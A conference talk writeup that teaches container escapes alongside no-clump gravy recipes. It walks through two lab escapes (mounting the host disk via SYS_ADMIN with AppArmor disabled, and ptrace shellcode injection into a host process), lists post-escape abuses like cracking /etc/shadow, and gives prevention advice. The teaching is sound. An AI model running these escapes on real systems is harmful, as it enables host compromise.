---
title: "A gentle introduction to container escapes and no-clump gravy"
date: 2024-03-24
excerpt: "🥞 From PancakesCon 5 - it's containers and gravy! 🥞"
tags:
- security
- containers
- food
image: /assets/graphics/2024-03-24-containers-and-gravy/square-painting.png
---

**Part 1: A gentle intro to container escapes** ([link](#containers-101)) 🔐 Lots of security and sysadmin courses talk about a "container escape", but what is that _really_?  We'll go over what a container is, demonstrate how to escape from it, and why that's not a good thing.  Then we'll talk about common ways to prevent this exploit.

**Part 2: No-clump gravy** ([link](#no-clump-gravy)) 👩🏻‍🍳 Stop ruining your gravy, pan sauces, etc. with clumpy flour or adding so much it becomes solid.  Learn how to balance fat and flour for perfect pan gravy, then a couple techniques on how to recover just in case it wasn't right the first time.

> This is slides, code, and demo walkthrough as shown live on 24 March 2024 at [PancakesCon 5](https://pancakescon.com/2024-conference-information/)! 🥞
>
> Here's the [slides](https://github.com/some-natalie/some-natalie/raw/main/assets/slides/2024-03-24_PancakesCon-Containers-and-Gravy.pdf) as presented.  Since there's no screen-sharing on a website, I can't bounce back and forth between code and a browser and this talk like I could in real life.  There's lots more code snippets, links, and screenshots here than in the original deck to make up for that. 💖
{: .prompt-info}

## Introduction

![about-me](/assets/graphics/2024-03-24-containers-and-gravy/about-me.png){: .shadow .rounded-10}

Hi, I'm Natalie.  I talk to the Feds and defense folks about containers, application security, and secure software development as a solutions engineer.  It's an amazingly fun job!

I love to cook.  We all have to eat, so why not enjoy what you eat and make it too?

Both of these are exhilarating and humbling because there's always so much to learn.

🌸 **I have some biases** 🌸

1. I work in a technical sales role in the application security space.  Today's topic isn't closely related to my work, but I clearly have opinions on the importance of the problem and care about it.
1. I also like tasty food.  Everyone has to eat, why not enjoy both making and eating?
1. Making the right choice easy is the best way to encourage good habits for both healthy eating and secure software development.

## Containers 101

### How'd we even get here

![k8s-history](/assets/graphics/2024-03-24-containers-and-gravy/how-we-got-here.png){: .shadow .rounded-10 }
_([image source](https://kubernetes.io/docs/concepts/overview/#going-back-in-time) in the Kubernetes documentation)_

> Despite the "left to right" connotation of forward progress here, it's more chronological than anything else.  All three are totally valid ways to run production applications today.
{: .prompt-info}

📜 _In the great before times,_ applications were deployed directly on hardware running in racks (bare metal).  To maximize utilization of these bigger boxes, perhaps multiple applications were running side-by-side.  The potential problem here became how to isolate these apps from each other, how to manage their resources so that no one consumed more than their share, and having to own and operate enough for peak capacity.  What happens when APP A and APP B are on the same machine, but need a different version of something in the operating system?

📦 Virtual machines (VMs) were the first big step in solving these problems.  They allowed for multiple operating systems to run on the same hardware in isolation.  However, it also allowed for workloads to be orchestrated across hardware using tools like the Linux kernel virtual machine's [virt-manager](https://virt-manager.org/), Microsoft [Hyper-V](https://learn.microsoft.com/en-us/windows-server/virtualization/hyper-v/hyper-v-on-windows-server), or VMware [vSphere](https://www.vmware.com/products/vsphere.html).  This increased the hardware utilization and resiliency of our deployments at the cost of increased overhead, as each virtual machine has its' own operating system to run the application we need.[^vmescapes]

💡 What if we could remove the resources needed by a virtual machine and allow an application to only carry with it the things it needs to run?  Unlike in bare metal, this allows our application to own its' dependencies exclusively.  The key software behind it is called a [container runtime](https://kubernetes.io/docs/setup/production-environment/container-runtimes/) and for the scope of today, we're going to treat them all as interchangeable.  It allows us to pack "more app, less OS" on the same hardware compared to VMs without losing all of the benefits of that model, like orchestration across hardware.[^scope]

Now we're thinking in containers!

### What's a container, anyways?

There's an engineering compromise in this model of application deployment - we are losing some isolation in order to more efficiently use our resources.  We are not losing all isolation, though, especially if we're mindful of what a container is and how it works.

<div style="text-align:center"><p style="font-size: 20px"><b>
✨ A container is a process. ✨
</b></p></div>

It isn't that much different from our bare metal application in that respect.  However, it can also carry its' own dependencies wherever it runs, making it more like a VM.  Like any other process, the host handles resource management and puts some guardrails in place to isolate it from other containers and processes it is running.  These guardrails are a combination of Linux kernel features and tools in [userland](https://en.wikipedia.org/wiki/User_space_and_kernel_space) (outside of the kernel).  While these all do something a little different, **each of these affect our ability to escape and move laterally** once we have escaped.  Let's dive in.

### Seccomp

The lowest level of our container stack is the operating system on the host.  These resources are accessed by any process in the operating system (a container or not) by system calls ([syscalls](https://en.wikipedia.org/wiki/System_call)).  These allow the process to interact with resources, like reading a file or writing to a network socket, and try to guarantee it plays nicely with everyone else sharing the same hardware.  We could spend many hours talking about system calls, but this is all we need for today.[^syscalls]

The foundation we build on is the Linux kernel's Secure Computing state, usually called [seccomp](https://man7.org/linux/man-pages/man2/seccomp.2.html).  Introduced in the mid 2000's, it has been critical to process security.  It limits the system calls a process can make, allowing the OS to isolate processes better.

🪤 I think of seccomp as **a mouse trap for processes** - a process can enter, but the only way out is death.  While alive, it can read and write to files it has open.  It can exit nicely (`exit()`) and return a signal on if it was successful or not (`sigreturn()`).  If the process tries to do anything beyond what it's been allowed to by making a forbidden syscall, the kernel kills the process or logs the event (if not enforcing).

Moving up a level, while there are _hundreds_ of system calls in Linux, your containerized application likely only needs a much smaller set of them.  Many container runtimes limit these by publishing and using a default seccomp profile.  The Docker engine publishes good documentation on their [seccomp profile](https://docs.docker.com/engine/security/seccomp/#significant-syscalls-blocked-by-the-default-profile) as an example.

### Namespaces

Moving up a level in the kernel are [namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html).  **These define what a process is allowed to _see_.**  It's how the system shows resources to a process, but they can appear dedicated for isolation.[^notk8s]  There are eight at present.  At a high level:

1. `cgroup` - control groups, [more on this in a moment](#control-groups-cgroups)
1. `ipc` - inter-process communication, does exactly what it sounds like
1. `mount` - controls mount points, enabling filesystem reads and writes
1. `network` - a virtual network stack, enabling network communication
1. `process` - process IDs
1. `time` - system time
1. `uts` - allows a process to know the hostname (stands for Unix Time-Sharing)
1. `user` - user IDs and mapping them between host and process

Here's a quick example of passing one namespace, the hostname, into a container.  Note how the `--uts=host` flag changes to allow the host's name in the container.  Without it, the container uses a random container identifier as its' hostname.

```shell-session
user@demo:~$ docker run -it --uts=host ubuntu:jammy bash
root@demo:/# exit
exit

user@demo:~$ docker run -it ubuntu:jammy bash
root@21f946f01f9c:/# exit
exit

user@demo:~$ docker ps
CONTAINER ID   IMAGE          COMMAND   CREATED         STATUS         PORTS     NAMES
21f946f01f9c   ubuntu:jammy   "bash"    4 seconds ago   Up 4 seconds             jolly_galois
```
{: file='from the host VM'}

Minimizing what's available to a process minimizes our attack surface.  Some of these are likely not to provide much foothold, like system time.  Others are much more impactful.  Let's look more at one of these in particular, control groups.

### Control groups (cgroups)

[Control groups](https://man7.org/linux/man-pages/man7/cgroups.7.html) are similar to a weird file system[^versions].  **They define what the process is allowed to _have_.**  This is how the kernel knows to limit a process to only have so much memory or CPU time.

Ideally, we humans aren't going to interact with performance-tuning or rate-limiting individual applications.  There are usually sensible defaults in place, but you can restrict them further if you'd like.  If this is set incorrectly or limited, it provides an easier path to consuming all the resources on a system.  This is also how a container runtime and orchestrator can predict resource usage on a machine.  Here's an example of setting a memory and CPU limit on a container:

```shell
docker run -it \
  --cpus="1.5" \
  --memory="1g" \
  ubuntu:jammy bash
```
{: file='from the host VM'}

Since this is a filesystem (usually mounted at `/sys/fs/cgroup`), escaping our container could allow writing or changing these to perform a **denial of service attack**.  The underlying host features we talked about so far are _how_ our container runtime knows to give this container these resources and constraints.  Now let's talk about permissions to do naughty things!

### Capabilities

![i-am-root](/assets/graphics/memes/i-am-root.jpeg){: .w-50 .shadow .rounded-10 .right}

🧚🏻‍♀️ _Once upon a time,_ one was either an all-capable administrator (`root`) or a plebeian with no special powers (user).  That binary all-or-nothing approach of "root or not-root" has been replaced by [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html).  **These define what a process is allowed to _do_.**

Capabilities allow users to selectively escalate processes with scoped permissions such as bind a service to a port below 1024 (`CAP_NET_BIND_SERVICE`) or read the kernel's audit log (`CAP_AUDIT_READ`).  There are about 40 unique capabilities, which is much more than can be covered today.

Granting minimal permissions to each part of your containerized application is tricky.  It requires developers to understand deeply what the app needs to do and how that translates to kernel capabilities.  It's tempting to just "give it everything" and move on, which is why we'll talk more about `CAP_SYS_ADMIN` in our demo.

### OverlayFS

These processes use [overlayfs](https://docs.kernel.org/filesystems/overlayfs.html), **a stacking filesystem that containers use.**  It's best summarized by the [commit message](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e9be9d5e76e34872f0c37d72e25bc27fe9e2c54c) adding it to the kernel:

> Overlayfs allows one, usually read-write, directory tree to be overlaid onto another, read-only directory tree. All modifications go to the upper, writable layer. This type of mechanism is most often used for live CDs but there is a wide variety of other uses.

This is how the container process can both carry its' dependencies with it and not interfere with other processes' files on the host.  You can read more about overlay files in the [kernel documentation](https://docs.kernel.org/filesystems/overlayfs.html) or in Julia Evan's lovely [zine on overlayfs](https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/).  Ideally, things you don't want a container to write to are read-only on the host, and the container can't write to them.  That's not always how it's been configured though.

### Mandatory access control (MAC)

Lastly, no container security talk would be complete without mentioning some host-based mandatory access control (MAC) system.  The most common ones are [AppArmor](https://wiki.apparmor.net/index.php/Main_Page) or [SELinux](https://github.com/SELinuxProject).  These act as watchdogs to **ensure each process (container or not) is only touching resources it's allowed to** based on the user, their role, and the files/processes/tasks that are attempted.[^color]

😩 The reason I bring this up is that **it's common to disable these**.

It's often the top-rated answer on StackOverflow or the first "fix" in a blog post that ranks high in search results.  It is _always_ a bad idea to disable these, as it's a critical layer of security that can prevent a container from doing things it shouldn't be doing.  So naturally, we'll be disabling these for our demo!

![roll-safe-selinux](/assets/graphics/memes/roll-safe-selinux.jpg){: .w-75 .shadow .rounded-10}

I thought perhaps artificial intelligence assistants would help.  I asked how to fix an error message when AppArmor stopped a container from doing something unsafe.  It did tell me what I was doing might have security implications, but it didn't warn me beyond that.

![copilot-light](/assets/graphics/2024-03-24-containers-and-gravy/copilot-light.png){: .light .rounded-10 .w-75}
![copilot-dark](/assets/graphics/2024-03-24-containers-and-gravy/copilot-dark.png){: .dark .rounded-10 .w-75}
_Technically correct, yet unwise - I'm feeling pretty secure about having a job. Thanks AI! 🤖_

### And this relates to security how?

A container is a Linux process.  Understanding the restraints in place and how they work is critical to understanding how they fail or can be misconfigured.  This is how you gain a foothold and move around past where you're supposed to be.

If it can be hard to understand, it's likely to be easy to do insecurely.

There continues to be astonishing amounts of work to improve this by default.  **Sensible defaults are probably the most powerful tool in secure systems.**  As an example, it used to be that Docker always ran as a service (daemon) using the root user.  This is no longer the case and [rootless Docker](https://docs.docker.com/engine/security/rootless/) is now the suggested default.  Other container runtimes, such as [Podman](https://podman.io/), don't use a daemon at all.

### A metaphor too far

![boat-of-boats](/assets/graphics/2024-03-24-containers-and-gravy/boat-of-boats.png){: .w-50 .shadow .rounded-10 .left}

Let's imagine we put a ping-pong ball, representing a user or input, in one of these gravy boats inside a massive container ship.  It's a bit much for a metaphor, but bear with me a moment.

How secure is that ball in one of these gravy boats?

Is it hard for the ball to roll or bounce between the boats?

What if we're in rough seas?

Now what happens if the ball was glued inside or there's a lid on top?  It'd be a lot harder to get out, right?

**That's our container escape safeguards** that we just talked about.

### Planning our escape

![misconfigurations](/assets/graphics/memes/misconfigurations.JPG){: .w-25 .shadow .rounded-10 .right}

Widely speaking, there are two types of paths out of a container:

1. Unpatched vulnerabilities
1. Unsafe configurations

The first is what's typically imagined at the phrase "container escape".  It's a flaw in the container runtime or the kernel that allows a process to do unsafe things - like read or write to other processes.  As a recent example, a group of CVEs named ["leaky vessels"](https://www.wiz.io/blog/leaky-vessels-container-escape-vulnerabilities) affects the [runc](https://github.com/opencontainers/runc) container runtime and [BuildKit](https://docs.docker.com/build/buildkit/) container builder.  These are normally remediated pretty quickly upstream and patched by updating your software.

I'm a fan of exploring the second one.  A mentor told me years ago that **"there's no patch for human stupidity"** and how true it is never really leaves my side.  I tend to not see stupid things too often, but what I do sadly see all the time is expediency to meet a deadline, under-resourced teams, constantly-changing priorities, maintenance windows that are months apart, or so many things to fix that no one even starts.

**I don't need to be clever to exploit misconfigurations.**  Even better is the fact that there are usually a valid business reason to configure things in this way _some of the time_, so a human overlooking that change in production is quite possible.

![shortcut](https://github.com/some-natalie/some-natalie/raw/main/assets/graphics/gifs/shortcut.gif){: .shadow .rounded-10}
_Workplace safety and infosec have a lot in common._

### The spicy take

I typically don't focus on or demonstrate that first type of escape.  Apart from updating your software in a timely fashion, there usually isn't as much preventative work here.  I can't believe I'm coming up on 20 years of working with these computer things.  It doesn't seem like it's been so long.  However, if I have learned _only_ one thing from every job and client and project I've worked on, it's this:

<div style="text-align:center"><p style="font-size: 20px"><b>
If updating any part of your software stack scares you,<br>🔥 FIX THAT FIRST 🔥
</b></p></div>

Understanding your systems from end to end, having the ability to quickly test / deploy / rollback changes, and quickly respond to security vulnerabilities and outages is how you fix that fear.  There are many ways to increase the security, reliability, observability, and fault tolerance of a system and maybe that's a good talk for another day.  It isn't always the shiny fun work, but the cost in time and discipline and tooling pays (usually unseen) dividends.

> **This isn't "doing more with less."**  It's merely hiding business continuity risks that accrue over time, even if no changes are made to any system.  **Technical debt has real costs** for all the humans in and around it.  Like financial debt, **it accumulates compound interest.**  It is not "prioritizing reliability", it just hasn’t failed yet. When it does, it’ll be massively harder to recover than if we’d made those **little payments of resiliency on our tech debt.**
>
> Listen to your feelings.  If you're scared to touch it, something is deeply wrong.
{: .prompt-danger}

`/end spicy take`

## Demo time

![prayer-to-demo-gods](/assets/graphics/memes/se-prayer.jpg){: .w-50 .shadow .rounded-10 .right}

If you're wanting to follow along, you'll need a Linux machine with a container runtime installed.  For the demo, here's what I used.

- [Ubuntu 22.04 LTS](https://releases.ubuntu.com/jammy/) (Jammy Jellyfish)
- [Docker Engine](https://docs.docker.com/engine/install/ubuntu/) for container runtime

I picked Ubuntu and Docker for how common they are in enterprise uses, but these same principles should work if you swap in other hosts or runtimes.  **These are both situations I have encountered in the field.**[^sudo] 😱

### Escape - mount the host filesystem

First up, let's take a look outside my container at some of the host's files.  For the demo, first make a flag at `/boot/flag.txt` to read and write to for showing your daring escape.

```shell-session
user@demo:~$ echo "hiya, you found me at pancakescon 5!" | \
  sudo tee -a /boot/flag.txt

hiya, you found me at pancakescon 5!
```
{: file='from the host VM'}

Now let's start a container with _only_ the minimum permissions needed to mess with host file systems.  Line by line, this command:

1. Runs a container interactively (`-i`) and with a terminal (`-t`).
1. Drops all capabilities, but then adds back `SYS_ADMIN`.
1. Disables AppArmor in order to use `mount`.  This is, sadly, common to disable or never enable in the first place.  More on that in a little bit.
1. Mounts the `/dev/` folder on the host to the root directory in the container.  This can be anywhere in the destination file system, but root is easy enough.
1. Uses the `ubuntu:jammy-20240227` image from [Docker Hub](https://hub.docker.com/_/ubuntu/tags)
1. To run `bash`, a shell to do things interactively.

```shell
docker run -it \
  --cap-drop=ALL --cap-add=SYS_ADMIN \
  --security-opt apparmor=unconfined \
  --device=/dev/:/ \
  ubuntu:jammy-20240227 \
  bash
```
{: file='from the host VM'}

From within the container now, let's have a little fun.  The next steps show us:

1. Listing the available block devices with `lsblk`.  This shows that `sda1`, at around 30 G, is likely interesting to an adversary.  It's the source of a few key files, like our hostname and DNS information, which we're likely to get from our host.
1. From there, I just go for trying to mount it with `mount /sda1 /mnt` ... which works!
1. Now list the files there to see our flag!
1. Use `cat` to read it to the terminal.
1. Bonus points - let's try to write to it with another `echo >> file`.  This works!
1. Use `cat` to see the whole file now.

```shell-session
root@374fb07f013f:/# lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
loop0     7:0    0 91.8M  1 loop
loop1     7:1    0 40.4M  1 loop
loop2     7:2    0 63.9M  1 loop
sda       8:0    0   30G  0 disk
|-sda1    8:1    0 29.9G  0 part /etc/hosts
|                                /etc/hostname
|                                /etc/resolv.conf
|-sda14   8:14   0    4M  0 part
`-sda15   8:15   0  106M  0 part
sdb       8:16   0   16G  0 disk
`-sdb1    8:17   0   16G  0 part

root@374fb07f013f:/# mount /sda1 /mnt

root@374fb07f013f:/# ls /mnt
bin   dev  flag.txt  lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  etc  home      lib32  libx32  media       opt  root  sbin  srv   tmp  var

root@374fb07f013f:/# cat /mnt/flag.txt
hiya, you found me at pancakescon 5!

root@374fb07f013f:/# echo -en "ubuntu was here\n" >> /mnt/flag.txt

root@374fb07f013f:/# cat /mnt/flag.txt
hiya, you found me at pancakescon 5!
ubuntu was here
```
{: file='inside the ubuntu container'}

⚠️ **What trouble can we get into?**  Since we have root access to the host's operating system, a few naughty things could be to

- Mess with name resolution in `/etc/hosts` or `/etc/resolv.conf` to establish connectivity to a malicious server without a lookup.
- Get passwords to crack out of `/etc/shadow` or mess with login assignments in `/etc/passwd`.
- Replace a trusted executable with something already compromised.
- Tamper with [Kerberos](https://web.mit.edu/kerberos/) or [SSSD](https://sssd.io/) or other authentication services to bypass them.
- Tamper with the files in the boot partition to change the kernel or bootloader.
- Edit server configuration files to change its' behavior.

I'm not just picking on Ubuntu here.  Here's the exact same escape running in Red Hat's universal base image (UBI).  Launch it in the same way we did the first one.

```shell
docker run -it \
  --cap-drop=ALL --cap-add=SYS_ADMIN \
  --security-opt apparmor=unconfined \
  --device=/dev/:/ \
  registry.access.redhat.com/ubi9/ubi:latest \
  bash
```
{: file='from the host VM'}

And now the same escape path works here too.

```shell-session
[root@5bcb54de65eb /]# lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
loop0     7:0    0 91.8M  1 loop
loop1     7:1    0 40.4M  1 loop
loop2     7:2    0 63.9M  1 loop
sda       8:0    0   30G  0 disk
├─sda1    8:1    0 29.9G  0 part /etc/hosts
│                                /etc/hostname
│                                /etc/resolv.conf
├─sda14   8:14   0    4M  0 part
└─sda15   8:15   0  106M  0 part
sdb       8:16   0   16G  0 disk
└─sdb1    8:17   0   16G  0 part

[root@5bcb54de65eb /]# mount /sda1 /mnt

[root@5bcb54de65eb /]# echo -en "ubi9 was here too\n" >> /mnt/flag.txt

[root@5bcb54de65eb /]# cat /mnt/flag.txt
hiya, you found me at pancakescon 5!
ubuntu was here
ubi9 was here too
```
{: file='inside the ubi9 container'}

Lastly, validate that we wrote to that file from the host VM.

```shell-session
user@demo:~$ cat /boot/flag.txt
hiya, you found me at pancakescon 5!
ubuntu was here
ubi9 was here too
```
{: file='from the host VM'}

### Prevention - mount the host filesystem

There are a few places here where this path out would be hard to pull this off.  Let's dig in:

1. Running the container interactively and with a terminal should be reserved for development.  It's handy to debug things live.  It's easy to forget to remove these packages, any extra development dependencies, and the settings to run it as privileged before promoting a container into production.  Neither of these should be necessary in production.
1. Adding the `SYS_ADMIN` capability is effectively allowing your container to run as root (or using the `--privileged` flag in your container runtime).  Dropping everything, but adding _almost_ everything back doesn't really improve your posture any.
1. Disabling AppArmor (or SELinux) makes me a sad panda. 🐼  It's common to run a search for an error message and have the highest-rated answer be something exceptionally unsafe - like doing exactly this.
1. Lastly, while there may be good reasons to mount a filesystem from the host into a container, mounting all of `/dev/` is way beyond reasonable.  This gives the container access to all devices on the host.

This seems like a case of something that works okay in experimentation, and likely isn't too risky on a dev's endpoint before it gets committed.  The problem is in not revising these settings as a project matures and thinks about production.

### Escape - modify a host process in memory

This one is only a little more complicated.  We'll build a container ([dockerfile](https://github.com/some-natalie/some-natalie/blob/main/assets/pancakescon5/Dockerfile)) and compile a small program ([source code](https://github.com/some-natalie/some-natalie/blob/main/assets/pancakescon5/inject.c)) to inject arbitrary shell code into a running process.  Open three terminals to your VM to follow along.

From the first session, build and launch the container.  This time, we only need the `SYS_PTRACE` capability.

```shell
# setup
vim test.Dockerfile
docker build -f test.Dockerfile -t test:latest .

# launch the container
docker run -it \
  --pid=host \
  --cap-drop=ALL --cap-add=SYS_PTRACE \
  --security-opt apparmor=unconfined \
  test:latest \
  bash
```
{: file='session #1'}

Now launch a simple HTTP server from the second session.  No need to get fancy here.

```shell-session
user@demo:~$ python3 -m http.server 8080 &
[1] 4033
user@demo:~$ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```
{: file='session #2'}

Probe the ports from the third session.  As expected, port 8080 is open and port 5600 is not.

```shell-session
user@demo:~$ nc -vz 127.0.0.1 8080
Connection to 127.0.0.1 8080 port [tcp/http-alt] succeeded!

user@demo:~$ nc -vz 127.0.0.1 5600
nc: connect to 127.0.0.1 port 5600 (tcp) failed: Connection refused
```
{: file='session #3'}

Now copy in our escape's [source code](https://github.com/some-natalie/some-natalie/blob/main/assets/pancakescon5/inject.c) using `vim` to change the port it's listening on in memory.  Compile it with `gcc`, then run it and pass in the PID of the server process from within the container (in session #1).

```shell-session
root@0079dd71ec0e:/# vim inject.c
root@0079dd71ec0e:/# gcc -o inject inject.c
root@0079dd71ec0e:/# ./inject 4033
+ Tracing process 4033
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x7f0c37be3bbf
+ Setting instruction pointer to 0x7f0c37be3bc1
+ Run it!
root@0079dd71ec0e:/#
```
{: file='session #1, inside the container'}

Verify connectivity in the third session.  Uh oh ... it's an open port! 😱

```shell-session
user@demo:~$ nc -vz 127.0.0.1 8080
Connection to 127.0.0.1 8080 port [tcp/http-alt] succeeded!

user@demo:~$ nc -vz 127.0.0.1 5600
Connection to 127.0.0.1 5600 port [tcp/*] succeeded!
```
{: file='session #3'}

### Prevention - modify a host process in memory

![ops](/assets/graphics/memes/worked-in-dev.jpg){: .w-50 .shadow .rounded-10 .right}

Here's what is going on and the many ways this could be thwarted:

1. Using `--pid=host` allows the container to run using the host's PID namespace, allowing it to see and interact with all processes on the host.  This is commonly used when the container holds debugging tools such as `gdb` that would need to interact with other containers or processes.
1. Adding `CAP_SYS_PTRACE` allows the container to read and write to memory in arbitrary locations using the `ptrace` system call.  It's super handy in debugging!
1. Again, disabling AppArmor is never a good idea. 😢

All of the above have valid uses _in development_.  These should be revised before you set real, and possibly malicious, people loose on your containerized application.

## Container best practices

An always-incomplete list of top best practices includes:

- **Be mindful** of the kernel capabilities.  Using `--privileged`, `--cap-add=SYS_ADMIN`, etc., is risky.  Use `--cap-drop=ALL` to drop all capabilities, add back only what you need ([full list](https://man7.org/linux/man-pages/man7/capabilities.7.html)), then remove the ability to change these at runtime with `--security-opt="no-new-privileges=true"` (for Docker, other runtimes have other syntax to do the same thing).
- **Don't disable SELinux or AppArmor.**  This is true even if containers were never in the picture.
- **Use a non-root user** within your container.  Notice how each of these demos didn't specify that and the user was root, as it's a common default.
- Use **trusted images** that are rebuilt regularly with security updates.[^job]
- Keep the hosts **up to date** too.
- **Review your dependencies** and revise them as needed between development and production.

Each of these practices are an imperfect layer of security, preventing our naughty escapades and malicious actors.  There's always some valid business reason somewhere to not follow it.  Nonetheless, each layer is imperfect.  Together, though, and it combines into a formidable system that can be forgiving of one or two of these deviations without a huge impact on the system.  It's like looking through a bunch of slices of swiss cheese - sometimes the holes may line up for you to see through, but there's a lot of them to be present for you to see all the way through.  This is called **defense in depth**.

![swiss-cheese-in-depth](/assets/graphics/2024-03-24-containers-and-gravy/swiss-cheese-in-depth.png){: .w-75 .shadow .rounded-10}
_defense in all of its' cheesy depth_

## Resources to learn more about container security

These are in no particular order, just links I've found be super handy.

- Docker's blog on how [containers are not VMs](https://www.docker.com/blog/containers-are-not-vms/) from 2016
- Containers from Scratch, a fantastic [GitHub repo](https://github.com/lizrice/containers-from-scratch) and [YouTube](https://www.youtube.com/watch?v=MHv6cWjvQjM) showing how containers work without an abstraction like Docker
- [Datadog Security Labs](https://securitylabs.datadoghq.com/) Container Security Fundamentals
  - [Part 1](https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-1) - Exploring containers as processes
  - [Part 2](https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-2) - Isolation & namespaces
  - [Part 3](https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-3) - Capabilities
- [The Children's Illustrated Guide to Kubernetes](https://www.cncf.io/phippy/the-childrens-illustrated-guide-to-kubernetes/)
- Jérôme Petazzoni, "Do not use Docker in Docker for CI", September 2015, [link](https://jpetazzo.github.io/2015/09/03/do-not-use-docker-in-docker-for-ci/).  There's tons of info on Docker-in-Docker from [@jpetazzo](https://github.com/jpetazzo), but this post in particular is great for outlining _why_ the `--privileged` was created and why it might not be a good use for CI.

## No-clump gravy

![gravy-glue](/assets/graphics/2024-03-24-containers-and-gravy/gravy-glue.jpg){: .w-75 .shadow .rounded-10}

**Gravy is the glue of the culinary world.**  Every culinary tradition seems to have recipes to use up the last of the pan.  It can cover up any shortcomings on the ingredients, transform the bland into something sublime, and ties a meal together.  I made the meme above by trying to list all the gravy types I'd made lately-ish and knew offhand - here's what they all are:

- **Pan gravy** - browned bits of roast meat drippings, flour, and water or broth
- **Sawmill gravy** - the traditional gravy of "biscuits and gravy" and we're making this below
- **Tomato gravy** - breakfast staple of the American southeast in summer of fresh diced tomatoes, chicken broth, and butter and flour
- **Chocolate gravy** - dessert sauce of cocoa powder, sugar, butter, water, and flour
- **Burger gravy** - American midwest classic using fatty ground beef, onions, steak sauce, flour, and water
- **Salt pork gravy** - rendered salt pork or bacon fat makes gravy too, common in New England
- **Shrimp gravy** - same idea as all of the above, but please take your shrimp out for a while because no one likes gummy overcooked shrimp!
- **Mushroom gravy** - mushrooms and onions with vegetable or beef broth, flour, and butter
- **Vegan gravy** - uses vegetable broth, soy or tamari, nutritional yeast, neutral oil, and flour
- **Mole sauce** - Mexican sauce of tomatoes, chili peppers, and spices (and fat and flour)
- **Béchamel** - French white sauce of butter, flour, and milk - I'm gonna argue this is gravy!
- **Velouté** - French sauce of butter, flour, and stock - also gravy.
- I'm sure to be forgetting a lot too, but there was no more room on the picture 🤤

Seasonings add a whole new dimension to play with flavors and textures as each part of the world has unique blends of vegetables and spices and techniques!

💞 Meals bring people together and gravy brings your meal together. 💞

It's a simple combination:

<div style="text-align:center"><p style="font-size: 20px"><b>
fat + starch + water = gravy
</b></p></div>

But while straightforward, there's some easy ways to mess it up too.  I'm talking about lumpy gravy, the plague of the holiday dinner table.  **Let's do some science** and never suffer with lumpy gravy again!

### What causes lumps

![ants-1](/assets/graphics/2024-03-24-containers-and-gravy/ants-nightmare-raft.webp){: .w-50 .shadow .rounded-10 .left}

This is no island or random bit of flood debris.

🔥 🐜 It's a raft of fire ants, adrift in the water. 🐜 🔥

When the water table rises, fire ants leave their nest.  They'll carry their young and their queen with them.  They then form these nightmare islands on the ground surface by locking their jaws and legs together.  This both increases the surface area of the water the ants make contact with to use surface tension _and_ decreases the density of the "ant blob" enough so that they can float.  Individually, these ants will all drown.  As the floodwaters rise, these rafts may move the fire ants to a new home, but they have a chance of survival together.  This isn't too different from how lumps form in your gravy.

Flour, like fire ants, acts weird when it gets wet.

Flour is a lot of things.  It’s finely ground grain, which is usually a seed of a plant.  In the United States, that plant is normally [wheat](https://en.wikipedia.org/wiki/Wheat).  Seeds have three parts:

- **Bran** - fiber-packed protective outer layer of the seed
- **Germ** - full of protein, fat, and vitamins because it's the part that grows into a new plant 🌱
- **Endosperm** - mostly-starchy part that feeds the the new plant until it has roots and leaves

![ants-2](/assets/graphics/2024-03-24-containers-and-gravy/ants-closer.webp){: .w-50 .shadow .rounded-10 .right}

The composition of the flour is determined by the plant's seed we used, how it's processed, and how much of the above is used.  This changes the flour's nutrition, behavior in recipes, and flavor.

The basics are still the same.

- Flour is mostly **starch**.  Starches ♥️ water.  It's _hydrophilic_, if science words are more your thing.
- Flour has some **fat** in it too.  It’s usually what makes it go rancid.
- Flour also has **protein**!  For many types of flour, it’s what forms gluten when wet.

🍞 Bread dough doesn’t magically rise - that happens with yeast or baking powder, which makes carbon dioxide for the air bubbles that then get trapped by that protein network.[^kab]

![ants-3](/assets/graphics/2024-03-24-containers-and-gravy/ants-close-up.webp){: .w-50 .shadow .rounded-10 .left}

💦 When flour gets wet, these three components start to interact in ways that form lumps.  The starches swell with water, acting like a sponge and expanding.  The proteins start to bond together, holding the surface of the lump together.  Heat makes these two processes happen faster - probably much faster than you can whisk them out.

Gravy isn't made by dissolving flour into fat and water, like sugar into tea.  Even the smoothest gravy is an [emulsion](https://en.wikipedia.org/wiki/Emulsion) - the flour is individual particle, suspended in liquid.  This means that no matter how long we let it simmer or sit, without physically breaking up the lumps, it'll never get smooth.

### Fixing lumps

There are a couple ways to fix lumps once they have already formed:

- Use a blender or food processor to rapidly break up the lumps.
- Whisk it.  It works the same as a food processor, but with more elbow grease.
- Run it through the finest strainer or sieve you own, usually a couple times to get it more or less smooth.
- Throw it out and try again.

<div style="text-align:center"><p style="font-size: 20px"><b>
Remember you want individually drowned ants,<br>not a nightmare lump of fiery DOOOOOM.
</b></p></div>

### Cheat code

[Wondra flour](https://www.goldmedalflour.com/our-flour/wondra-quick-mixing-all-purpose-flour/) or similar is a wheat flour that’s ultra-fine, pre-cooked, and dried.  It's available at most grocery stories.  You can think of it like "instant gravy".  It's also handy for dredging foods before frying, thickening soups or savory pie fillings, and more.  While you don't usually _need_ it, it can get you out of a culinary bad situation.  It's nice to use a cheat code from time to time, but remember a little goes a very long way.

## Recipes

Now that we're armed with the science of preventing lumps in our gravy, let's make some!

![brown-bits-flavortown](/assets/graphics/2024-03-24-containers-and-gravy/brown-bits.png){: .shadow .rounded-10}

### Roux

Roux is a simple fat and flour mixture that's cooked until it reaches the right shade of done.  Light roux is barely toasted and is the color of a light bread crust.  Lightly cooked roux is not changing the flavor of the dish, making it very versatile.  If you continue cooking it, stopping when it's a chocolate-y brown, it'll add a lot of umami but can overpower some dishes.

**Ingredients:**

- 1 cup of neutral oil, such as vegetable oil or canola oil
- 1 cup of all-purpose flour

**Directions:**

1. Whisk the two together cold in a saucepan.
1. Heat over medium heat, stirring CONSTANTLY!
